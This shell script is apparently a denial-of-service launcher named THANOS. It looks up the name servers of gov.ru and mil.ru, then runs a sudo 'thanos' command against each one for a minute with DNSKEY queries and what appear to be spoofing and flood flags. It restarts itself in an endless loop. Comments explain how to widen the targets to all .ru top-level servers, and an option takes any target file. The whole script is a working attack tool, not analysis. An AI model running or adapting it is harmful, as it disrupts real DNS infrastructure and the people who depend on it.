#!/bin/sh

if ! command -v bash >/dev/null 2>&1; then
  echo 'this script requires bash.'
  exit 1
fi

ARGS=${@}

ctrl_c() {
  echo
  echo 'Caught Ctrl-C. Exiting...'
  exit 1
}
trap ctrl_c INT

usage() {
  echo "
  usage: $0 <[-t TARGET_FILE]>

  [no arguments]  runs against default dns targets specified in script.
  -t|--target     [/path/to/target_file] targets dns hosts/ips specified in [target_file].
  -f|--file       [/path/to/target_file] targets dns hosts/ips specified in [target_file].
  "
  exit 1
}

if echo "$ARGS" | grep -q '\-h'; then
  usage
fi
if echo "$ARGS" | grep -q 'help'; then
  usage
fi

get_targets() {
  tmp=/tmp/.thanos_targets
  true > "$tmp"
  for i in $(cat "$TARGET_FILE"); do
    ip="$(echo "$i" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')"
    if [ -z $ip ]; then
      host="$(echo "$i" | grep -oE '.*\..*')"
    fi
    if [ ! -z $ip ]; then
      echo "$ip" >> "$tmp"
    elif [ ! -z "$host" ]; then
      echo "$host" >> "$tmp"
    fi
  done
  cat "$tmp"
}

if [ ! -z $2 ]; then
  if [ "$1" = "-t" ] || [ "$1" = "--target" ]; then
    FILE=1
    TARGET_FILE="$2"
  elif [ "$1" = "-f" ] || [ "$1" = "--file" ]; then
    FILE=1
    TARGET_FILE="$2"
  fi
  TARGETS="$(get_targets)"
else
  #ru_hosts="$(dig ns ru | grep -oE 'IN.*NS.*\.$' | awk '{print $NF}' | sed 's/.$//g')"
  gov_hosts="$(dig ns gov.ru | grep -oE 'IN.*NS.*\.$' | awk '{print $NF}' | sed 's/.$//g')"
  mil_hosts="$(dig ns mil.ru | grep -oE 'IN.*NS.*\.$' | awk '{print $NF}' | sed 's/.$//g')"
  #ru_ips="$(for i in $ru_hosts; do dig +short "$i"; done)"
  gov_ips="$(for i in $gov_hosts; do dig +short "$i"; done)"
  mil_ips="$(for i in $mil_hosts; do dig +short "$i"; done)"
  #TARGETS="$(echo "$ru_ips"; echo "$gov_ips"; echo "$mil_ips";)"
  TARGETS="$(echo "$gov_ips"; echo "$mil_ips";)"
  ### ALTERNATE CONFIGURATIONS:
  # to include tld ru servers:
  # - uncomment 'ru_hosts=...' line above
  # - uncomment 'ru_ips=...' line above
  # - uncomment FIRST 'TARGETS=...' line above
  # - comment-out SECOND 'TARGETS=...' line above
  ###
fi

echo
echo 'THANOS is running...'
for ip in $TARGETS; do
  hostname="$(dig -x "$ip" +short 2>&1 | sed 's/.$//')"
  if echo "$hostname" | grep -q 'timed out'; then
    echo "*** ${ip} is DOWN! ***"
    continue
  fi
  if [ ! -z $hostname ]; then
    echo "$(date "+%I:%M:%S:") currently targeting $ip ($hostname) for 1 minute..."
  else
    echo "$(date "+%I:%M:%S:") currently targeting $ip for 1 minute..."
  fi
  sudo thanos gov.ru "$ip" -t DNSKEY -S -R -d 60 -i 100
done
echo 'THANOS finished.'
sleep 10
exec $0 ${ARGS}

